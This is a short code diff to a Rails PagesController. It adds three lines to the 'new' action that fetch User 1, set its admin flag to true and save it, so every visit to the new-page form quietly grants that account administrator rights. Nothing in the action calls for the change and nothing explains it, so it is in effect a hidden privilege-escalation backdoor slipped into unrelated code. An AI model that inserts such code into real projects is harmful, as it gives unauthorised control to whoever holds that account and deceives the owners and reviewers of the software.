@@ -7,6 +7,9 @@ class PagesController < ApplicationController
   def new
     p = Page.new(title: params[:page_title])
     self.page = p.decorate
+    u = User.find(1)
+    u.admin = true
+    u.save
     render :new
   end
 
